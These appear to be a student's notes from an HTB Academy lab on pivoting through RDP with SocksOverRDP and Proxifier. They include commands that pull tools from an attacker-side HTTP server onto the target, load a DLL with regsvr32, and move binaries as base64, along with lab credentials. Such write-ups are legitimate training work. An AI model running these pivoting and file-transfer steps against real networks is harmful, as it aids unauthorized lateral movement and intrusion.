# RDP and SOCKS Tunneling with SocksOverRDP

If we not be able to use SSH for pivoting.

1) Download binairies

wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
unzip SocksOverRDP-x64.zip 
Archive:  SocksOverRDP-x64.zip
  inflating: SocksOverRDP-Plugin.dll  
  inflating: SocksOverRDP-Server.exe  


wget https://www.proxifier.com/download/ProxifierPE.zip
unzip ProxifierPE.zip 
Archive:  ProxifierPE.zip
   creating: Proxifier PE/
  inflating: Proxifier PE/Helper64.exe  
  inflating: Proxifier PE/Proxifier.exe  
  inflating: Proxifier PE/ProxyChecker.exe  
  inflating: Proxifier PE/PrxDrvPE.dll  
  inflating: Proxifier PE/PrxDrvPE64.dll  

2) Copy the SocksOverRDPx64.zip file to the target.

3) Loading SocksOverRDP.dll using regsvr32.exe

C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll

4) Connect to DC over RDP using mstsc.exe

A popup prompts that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080

5) Use the credentials victor:pass@123 to connect

6) Transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe from the foothold to DC 

7) Run SocksOverRDP-Server.exe as Administrator

8) Confirming the SOCKS Listener is Started

C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080
  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING

9) Transfer Proxifier portable to the foothold target

10) Configure Proxifier to forward all our packets to 127.0.0.1:1080

Profile / Proxy Server / Add...
Address : 127.0.0.1 
Port : 1080
SOCKS Version 5

11) Start mstsc.exe 
mstsc.exe uses Proxifier to pivot all our traffic via 127.0.0.1:1080 and tunnel it over RDP to 172.16.5.19

## LAB

nmap -sV -oA nmap $TARGET --stats-every=5s

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
unzip SocksOverRDP-x64.zip 

wget https://www.proxifier.com/download/ProxifierPE.zip
unzip ProxifierPE.zip

xfreerdp /u:htb-student /v:$TARGET
HTB_@cademy_stdnt!

python3 -m http.server

cd c:\Users\htb-student\Desktop\
(New-Object Net.WebClient).DownloadFile('http://10.10.15.158:8000/SocksOverRDP-x64.zip ','SocksOverRDP-x64.zip ')
(New-Object Net.WebClient).DownloadFile('http://10.10.15.158:8000/ProxifierPE.zip ','ProxifierPE.zip ')

tar -xf SocksOverRDP-x64.zip


EXtract all : 
c:\Users\htb-student\Desktop\ProxifierPE
c:\Users\htb-student\Desktop\SocksOverRDP-x64

C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll

(New-Object Net.WebClient).DownloadFile('http://10.10.15.158:8000/SocksOverRDP-Plugin.dll ','SocksOverRDP-Plugin.dll')

xfreerdp /v:$TARGET /d:HTB /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/htb-ac-786011

md5sum id_rsa


172.16.6.155 (jason:WellConnected123!)

cd C:\Users\htb-student\Desktop\
Get-FileHash "C:\Users\htb-student\Desktop\SocksOverRDP-Server.exe" -Algorithm md5
CAF3898D0CFA91CA3ACC43B620BB0ED2
[Convert]::ToBase64String((Get-Content -path "C:\Users\htb-student\Desktop\SocksOverRDP-Server.exe" -Encoding byte)) > b64.txt

[IO.File]::WriteAllBytes("\SocksOverRDP-Server.exe", [Convert]::FromBase64String("TVqQAAMAAAAEAAAA//AAAAA="))

Get-FileHash "SocksOverRDP-Server.exe" -Algorithm md5
